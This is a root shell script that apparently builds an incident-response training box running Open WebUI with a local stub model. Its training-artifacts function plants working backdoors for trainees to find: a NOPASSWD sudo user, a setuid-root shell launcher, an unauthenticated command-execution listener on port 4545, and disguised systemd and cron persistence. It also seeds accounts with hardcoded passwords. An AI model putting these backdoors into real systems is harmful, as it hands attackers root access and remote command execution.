#!/usr/bin/env bash
set -Eeuo pipefail

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
IGNITION_IP="198.18.6.107"
STARTER_PASSWORD="H00ves0nTheM00n"
OPEN_WEBUI_VERSION="v0.11.3"
INSTALL_TRAINING_ARTIFACTS=1

usage() {
  printf 'Usage: %s [--ignition-ip IP] [--password VALUE] [--open-webui-version TAG] [--skip-training-artifacts]\n' "$0"
}

install_training_artifacts() {
  printf '[Ignition] Planting incident-response findings...\n'
  install -d -m 0755 /opt/ihpl-training /usr/local/libexec /home/jmoney/Downloads

  if ! id flight-cache >/dev/null 2>&1; then
    useradd --create-home --shell /bin/bash flight-cache
  fi
  usermod --shell /bin/bash --home /home/flight-cache flight-cache
  install -d -o flight-cache -g flight-cache -m 0750 /home/flight-cache
  printf 'flight-cache:%s\n' "$STARTER_PASSWORD" | chpasswd
  printf 'flight-cache ALL=(root) NOPASSWD: ALL\n' > /etc/sudoers.d/flight-cache
  chmod 0440 /etc/sudoers.d/flight-cache
  visudo --check --file=/etc/sudoers.d/flight-cache

  cat > /tmp/launch-diagnostics.c <<'EOF'
#define _GNU_SOURCE
#include <unistd.h>
int main(void) {
    if (setgid(0) != 0 || setuid(0) != 0) return 1;
    execl("/bin/bash", "bash", "-p", NULL);
    return 1;
}
EOF
  gcc -O2 -Wall -Wextra -o /usr/local/libexec/launch-diagnostics /tmp/launch-diagnostics.c
  rm -f /tmp/launch-diagnostics.c
  chown root:root /usr/local/libexec/launch-diagnostics
  chmod 4755 /usr/local/libexec/launch-diagnostics

  install -m 0755 /usr/bin/sleep /opt/ihpl-training/telemetry-indexer
  cat > /etc/systemd/system/telemetry-indexer.service <<'EOF'
[Unit]
Description=Legacy telemetry indexing compatibility service
After=network.target

[Service]
Type=simple
User=nobody
ExecStart=/opt/ihpl-training/telemetry-indexer infinity
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

  cat > /etc/cron.d/telemetry-index-refresh <<'EOF'
* * * * * root /usr/bin/systemctl restart telemetry-indexer.service && /usr/bin/touch /var/tmp/.telemetry-index-heartbeat
EOF
  chmod 0644 /etc/cron.d/telemetry-index-refresh

  cat > /home/jmoney/Downloads/telemetry_viewer <<'PY'
#!/usr/bin/env python3
import socket
import subprocess

with socket.socket() as server:
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", 4545))
    server.listen(5)
    while True:
        client, _ = server.accept()
        with client:
            client.sendall(b"telemetry> ")
            command = client.recv(4096).decode(errors="replace").strip()
            result = subprocess.run(command, shell=True, capture_output=True)
            client.sendall(result.stdout + result.stderr)
PY
  chown -R jmoney:jmoney /home/jmoney/Downloads
  chmod 0755 /home/jmoney/Downloads/telemetry_viewer

  cat > /etc/systemd/system/telemetry-viewer.service <<'EOF'
[Unit]
Description=Legacy telemetry viewer service
After=network.target

[Service]
User=jmoney
ExecStart=/home/jmoney/Downloads/telemetry_viewer
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

  cat > /etc/profile.d/telemetry-debug.sh <<'EOF'
# Unauthorized environment persistence finding.
export IHPL_TELEMETRY_DEBUG=1
EOF
  chmod 0644 /etc/profile.d/telemetry-debug.sh

  systemctl daemon-reload
  systemctl enable --now telemetry-indexer.service telemetry-viewer.service
  firewall-cmd --permanent --add-port=4545/tcp
  firewall-cmd --reload
  printf '[Ignition] Functional findings installed; only the IMIX indicator remains disconnected from C2.\n'
}

while (($#)); do
  case "$1" in
    --ignition-ip) IGNITION_IP="${2:?missing ignition IP}"; shift 2 ;;
    --password) STARTER_PASSWORD="${2:?missing password}"; shift 2 ;;
    --open-webui-version) OPEN_WEBUI_VERSION="${2:?missing version}"; shift 2 ;;
    --skip-training-artifacts) INSTALL_TRAINING_ARTIFACTS=0; shift ;;
    -h|--help) usage; exit 0 ;;
    *) printf 'Unknown argument: %s\n' "$1" >&2; usage >&2; exit 2 ;;
  esac
done

if [[ $EUID -ne 0 ]]; then
  printf 'Run this script as root.\n' >&2
  exit 1
fi
if [[ ! $IGNITION_IP =~ ^[0-9a-fA-F:.]+$ ]]; then
  printf 'IP parameter contains unsupported characters.\n' >&2
  exit 2
fi

install -d -m 0750 /var/log/ihpl-setup
exec > >(tee -a /var/log/ihpl-setup/ignition.log) 2>&1

DNF_ARGS=(-y)
if ! dnf -q makecache; then
  printf '[Ignition] Configured Fedora repositories are unavailable; using the signed Fedora 39 archive.\n'
  cat > /etc/yum.repos.d/ihpl-fedora-archive.repo <<'EOF'
[ihpl-fedora-archive]
name=Fedora 39 archive - Everything
baseurl=https://archives.fedoraproject.org/pub/archive/fedora/linux/releases/39/Everything/$basearch/os/
enabled=1
gpgcheck=1
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-fedora-39-primary

[ihpl-fedora-updates-archive]
name=Fedora 39 archive - Updates
baseurl=https://archives.fedoraproject.org/pub/archive/fedora/linux/updates/39/Everything/$basearch/
enabled=1
gpgcheck=1
gpgkey=file:///etc/pki/rpm-gpg/RPM-GPG-KEY-fedora-39-primary
EOF
  DNF_ARGS+=(--disablerepo=* --enablerepo=ihpl-fedora-archive --enablerepo=ihpl-fedora-updates-archive)
fi

printf '[Ignition] Installing supported packages...\n'
dnf "${DNF_ARGS[@]}" install openssh-server podman curl python3 sudo gcc firewalld

printf '[Ignition] Creating the plinktern administrator and jmoney scoring account...\n'
if ! id jmoney >/dev/null 2>&1; then
  useradd --create-home --shell /bin/bash jmoney
fi
if ! id plinktern >/dev/null 2>&1; then
  useradd --create-home --shell /bin/bash plinktern
fi
printf 'jmoney:%s\n' "$STARTER_PASSWORD" | chpasswd
printf 'plinktern:%s\n' "$STARTER_PASSWORD" | chpasswd
usermod -aG wheel plinktern
gpasswd --delete jmoney wheel >/dev/null 2>&1 || true
id jmoney >/dev/null
id plinktern >/dev/null
if [[ " $(id -nG plinktern) " != *' wheel '* ]]; then
  printf 'plinktern was not added to the wheel group.\n' >&2
  exit 1
fi

# Fedora cloud images commonly disable password authentication in a
# 50-cloud-init.conf drop-in. OpenSSH uses the first value it encounters, so
# install an earlier file instead of editing a cloud-managed configuration.
install -d -m 0755 /etc/ssh/sshd_config.d
cat > /etc/ssh/sshd_config.d/00-ihpl-password-auth.conf <<'EOF'
PasswordAuthentication yes
KbdInteractiveAuthentication yes
UsePAM yes
EOF
chmod 0644 /etc/ssh/sshd_config.d/00-ihpl-password-auth.conf
sshd -t
systemctl enable --now sshd firewalld
systemctl restart sshd

effective_sshd_config="$(sshd -T -C user=plinktern,host=localhost,addr=127.0.0.1)"
for required_setting in \
  'passwordauthentication yes' \
  'kbdinteractiveauthentication yes' \
  'usepam yes'; do
  if ! grep -Fqx "$required_setting" <<<"$effective_sshd_config"; then
    printf 'Effective SSH configuration is missing: %s\n' "$required_setting" >&2
    exit 1
  fi
done

firewall-cmd --permanent --add-service=ssh
firewall-cmd --permanent --add-service=http
firewall-cmd --reload

printf '[Ignition] Installing the local PlinkAI model endpoint...\n'
install -D -m 0755 "$SCRIPT_DIR/plinkai_stub.py" /opt/plinkai/plinkai_stub.py
cat > /etc/systemd/system/plinkai-stub.service <<'EOF'
[Unit]
Description=Offline PlinkAI OpenAI-compatible API
After=network.target

[Service]
Type=simple
User=nobody
ExecStart=/usr/bin/python3 /opt/plinkai/plinkai_stub.py
Restart=on-failure
RestartSec=3
NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable --now plinkai-stub.service

printf '[Ignition] Pulling Open WebUI %s...\n' "$OPEN_WEBUI_VERSION"
podman pull "ghcr.io/open-webui/open-webui:${OPEN_WEBUI_VERSION}"
install -d -m 0750 /var/lib/open-webui
cat > /etc/systemd/system/open-webui.service <<EOF
[Unit]
Description=Open WebUI ${OPEN_WEBUI_VERSION}
Requires=plinkai-stub.service
After=network-online.target plinkai-stub.service
Wants=network-online.target

[Service]
Type=simple
Restart=always
RestartSec=5
ExecStartPre=-/usr/bin/podman rm -f open-webui
ExecStart=/usr/bin/podman run --name open-webui --log-driver=journald -p 80:8080 -v /var/lib/open-webui:/app/backend/data:Z -e WEBUI_NAME=PlinkAI -e WEBUI_AUTH=true -e ENABLE_SIGNUP=false -e DEFAULT_USER_ROLE=user -e ENABLE_OLLAMA_API=false -e ENABLE_OPENAI_API=true -e BYPASS_MODEL_ACCESS_CONTROL=true -e OPENAI_API_BASE_URL=http://host.containers.internal:11435/v1 -e OPENAI_API_BASE_URLS=http://host.containers.internal:11435/v1 -e OPENAI_API_KEY=ihpl-local-only -e OPENAI_API_KEYS=ihpl-local-only ghcr.io/open-webui/open-webui:${OPEN_WEBUI_VERSION}
ExecStop=/usr/bin/podman stop -t 20 open-webui

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable open-webui.service
systemctl restart open-webui.service

printf '[Ignition] Waiting for Open WebUI...\n'
for attempt in {1..60}; do
  if curl --fail --silent http://127.0.0.1/health >/dev/null; then
    break
  fi
  if [[ $attempt -eq 60 ]]; then
    journalctl --no-pager -u open-webui.service -n 80
    printf 'Open WebUI did not become ready.\n' >&2
    exit 1
  fi
  sleep 5
done

python3 - "$STARTER_PASSWORD" <<'PY'
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

origin = "http://127.0.0.1"
base_url = f"{origin}/api/v1"
starter_password = sys.argv[1]


def request_json(method, path, payload=None, token=None, request_base_url=base_url):
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    request = urllib.request.Request(
        f"{request_base_url}{path}",
        data=None if payload is None else json.dumps(payload).encode(),
        headers=headers,
        method=method,
    )
    try:
        with urllib.request.urlopen(request, timeout=30) as response:
            return response.status, json.load(response)
    except urllib.error.HTTPError as error:
        response_body = error.read().decode(errors="replace")
        try:
            response_body = json.loads(response_body)
        except json.JSONDecodeError:
            pass
        return error.code, response_body


def request_text(method, path, payload=None, token=None, request_base_url=base_url):
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    request = urllib.request.Request(
        f"{request_base_url}{path}",
        data=None if payload is None else json.dumps(payload).encode(),
        headers=headers,
        method=method,
    )
    try:
        with urllib.request.urlopen(request, timeout=30) as response:
            return response.status, response.read().decode(errors="replace")
    except urllib.error.HTTPError as error:
        return error.code, error.read().decode(errors="replace")


admin = {
    "name": "Plinktern Administrator",
    "email": "plinktern@plinko.horse",
    "password": starter_password,
}

# Open WebUI permits its first administrator bootstrap while public signup is
# disabled. On reruns, authenticate the existing administrator.
status, result = request_json("POST", "/auths/signup", admin)
if status == 200:
    print(f"seeded {admin['email']}: HTTP {status}")
    admin_token = result["token"]
elif status in (400, 403, 409):
    status, result = request_json(
        "POST",
        "/auths/signin",
        {"email": admin["email"], "password": admin["password"]},
    )
    if status != 200:
        raise RuntimeError(
            f"could not authenticate existing Open WebUI administrator: HTTP {status}: {result}"
        )
    print(f"authenticated existing {admin['email']}: HTTP {status}")
    admin_token = result["token"]
else:
    raise RuntimeError(f"could not seed Open WebUI administrator: HTTP {status}: {result}")


def find_user(email):
    query = urllib.parse.urlencode({"query": email})
    status, result = request_json("GET", f"/users/?{query}", token=admin_token)
    if status != 200:
        raise RuntimeError(f"could not list Open WebUI users: HTTP {status}: {result}")
    users = result.get("users", []) if isinstance(result, dict) else result
    return next(
        (user for user in users if user.get("email", "").lower() == email.lower()),
        None,
    )


def upsert_user(name, email, password, role="user"):
    status, result = request_json(
        "POST",
        "/auths/add",
        {
            "name": name,
            "email": email,
            "password": password,
            "role": role,
            "profile_image_url": "/user.png",
        },
        token=admin_token,
    )
    if status == 200:
        print(f"seeded {email}: HTTP {status}")
    elif status not in (400, 409):
        raise RuntimeError(f"could not seed {email}: HTTP {status}: {result}")

    user = find_user(email)
    if user is None:
        raise RuntimeError(f"Open WebUI did not list the seeded account {email}")

    # Synchronize existing accounts too. Treating an existing address as success
    # without resetting its password can leave the scoring login unusable.
    status, result = request_json(
        "POST",
        f"/users/{user['id']}/update",
        {
            "name": name,
            "email": email,
            "password": password,
            "role": role,
            "profile_image_url": "/user.png",
        },
        token=admin_token,
    )
    if status != 200:
        raise RuntimeError(f"could not synchronize {email}: HTTP {status}: {result}")

    user = find_user(email)
    if user is None or user.get("role") != role:
        raise RuntimeError(f"Open WebUI account verification failed for {email}")

    status, result = request_json(
        "POST",
        "/auths/signin",
        {"email": email, "password": password},
    )
    if status != 200 or result.get("email", "").lower() != email.lower():
        raise RuntimeError(f"Open WebUI login verification failed for {email}: HTTP {status}: {result}")
    print(f"verified login for {email}: HTTP {status}")
    return result["token"]


jmoney_token = upsert_user("J-Money", "jmoney@plinko.horse", starter_password)
upsert_user("Telemetry Support Bot", "support.bot@plinko.horse", "Orbit-Support-2026!")

# Connection settings persist in Open WebUI's database and override container
# environment variables on reruns. Force the PlinkAI endpoint into that state.
plinkai_url = "http://host.containers.internal:11435/v1"
status, result = request_json(
    "POST",
    "/openai/config/update",
    {
        "ENABLE_OPENAI_API": True,
        "OPENAI_API_BASE_URLS": [plinkai_url],
        "OPENAI_API_KEYS": ["ihpl-local-only"],
        "OPENAI_API_CONFIGS": {},
    },
    token=admin_token,
    request_base_url=origin,
)
if status != 200 or result.get("OPENAI_API_BASE_URLS") != [plinkai_url]:
    raise RuntimeError(f"could not persist the PlinkAI connection: HTTP {status}: {str(result)[:500]}")

# Seed both the global browser default and jmoney's saved selection. Without
# these values, a fresh chat can submit an empty model before the selector has
# initialized, leaving that chat stuck behind Open WebUI's previous-error guard.
status, result = request_json(
    "POST",
    "/configs/models",
    {
        "DEFAULT_MODELS": "PlinkAI",
        "DEFAULT_PINNED_MODELS": "PlinkAI",
        "MODEL_ORDER_LIST": ["PlinkAI"],
        "DEFAULT_MODEL_METADATA": {},
        "DEFAULT_MODEL_PARAMS": {},
    },
    token=admin_token,
)
if status != 200 or result.get("DEFAULT_MODELS") != "PlinkAI":
    raise RuntimeError(f"could not set PlinkAI as the default model: HTTP {status}: {str(result)[:500]}")

status, result = request_json(
    "POST",
    "/users/user/settings/update",
    {"models": ["PlinkAI"]},
    token=jmoney_token,
)
if status != 200 or result.get("models") != ["PlinkAI"]:
    raise RuntimeError(f"could not save jmoney's PlinkAI selection: HTTP {status}: {str(result)[:500]}")

# Background title and tag generation must use the same available model.
status, task_config = request_json("GET", "/tasks/config", token=admin_token)
if status != 200 or not isinstance(task_config, dict):
    raise RuntimeError(f"could not read Open WebUI task settings: HTTP {status}: {str(task_config)[:500]}")
task_config["TASK_MODEL"] = "PlinkAI"
task_config["TASK_MODEL_EXTERNAL"] = "PlinkAI"
status, result = request_json(
    "POST",
    "/tasks/config/update",
    task_config,
    token=admin_token,
)
if status != 200 or result.get("TASK_MODEL_EXTERNAL") != "PlinkAI":
    raise RuntimeError(f"could not set the PlinkAI task model: HTTP {status}: {str(result)[:500]}")

status, result = request_json("GET", "/api/config", token=jmoney_token, request_base_url=origin)
if status != 200 or result.get("default_models") != "PlinkAI":
    raise RuntimeError(f"jmoney did not receive the PlinkAI browser default: HTTP {status}: {str(result)[:500]}")

status, result = request_json(
    "GET",
    "/api/models",
    token=jmoney_token,
    request_base_url=origin,
)
models = result.get("data", []) if isinstance(result, dict) else []
if status != 200 or not any(model.get("id") == "PlinkAI" for model in models):
    raise RuntimeError(f"jmoney cannot see PlinkAI: HTTP {status}: {str(result)[:500]}")

status, result = request_json(
    "POST",
    "/api/chat/completions",
    {
        "model": "PlinkAI",
        "messages": [{"role": "user", "content": "PlinkAI readiness check"}],
        "stream": False,
    },
    token=jmoney_token,
    request_base_url=origin,
)
choices = result.get("choices", []) if isinstance(result, dict) else []
if status != 200 or not choices:
    raise RuntimeError(f"jmoney PlinkAI completion verification failed: HTTP {status}: {str(result)[:500]}")

status, stream_body = request_text(
    "POST",
    "/api/chat/completions",
    {
        "model": "PlinkAI",
        "messages": [{"role": "user", "content": "PlinkAI streaming readiness check"}],
        "stream": True,
    },
    token=jmoney_token,
    request_base_url=origin,
)
stream_events = []
for line in stream_body.splitlines():
    if not line.startswith("data: ") or line == "data: [DONE]":
        continue
    try:
        stream_events.append(json.loads(line[6:]))
    except json.JSONDecodeError:
        pass
stream_finished = any(
    choice.get("finish_reason") == "stop"
    for event in stream_events
    if isinstance(event, dict)
    for choice in event.get("choices", [])
    if isinstance(choice, dict)
)
if status != 200 or "data: [DONE]" not in stream_body or not stream_finished:
    raise RuntimeError(f"jmoney PlinkAI streaming verification failed: HTTP {status}: {stream_body[:500]}")
print("verified jmoney default model and PlinkAI chat completion: HTTP 200")
PY

if [[ $INSTALL_TRAINING_ARTIFACTS -eq 1 ]]; then
  install_training_artifacts
fi

systemctl is-active --quiet sshd
systemctl is-active --quiet plinkai-stub
systemctl is-active --quiet open-webui
curl --fail --silent http://127.0.0.1:11435/v1/models >/dev/null
printf '[Ignition] Ready: http://%s/ (Open WebUI %s)\n' "$IGNITION_IP" "$OPEN_WEBUI_VERSION"
